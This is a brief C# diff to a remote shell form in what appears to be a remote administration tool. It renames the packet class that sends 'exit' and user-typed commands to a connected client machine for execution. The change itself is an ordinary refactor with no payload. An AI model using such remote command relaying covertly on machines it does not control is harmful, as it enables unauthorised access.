@@ -36,7 +36,7 @@ namespace xServer.Forms
 
         private void FrmRemoteShell_FormClosing(object sender, FormClosingEventArgs e)
         {
-            new Core.Packets.ServerPackets.ShellCommand("exit").Execute(_connectClient);
+            new Core.Packets.ServerPackets.DoShellExecute("exit").Execute(_connectClient);
             if (_connectClient.Value != null)
                 _connectClient.Value.FrmRs = null;
         }
@@ -74,7 +74,7 @@ namespace xServer.Forms
                             txtConsoleOutput.Text = string.Empty;
                             break;
                         default:
-                            new Core.Packets.ServerPackets.ShellCommand(input).Execute(_connectClient);
+                            new Core.Packets.ServerPackets.DoShellExecute(input).Execute(_connectClient);
                             break;
                     }
                 }
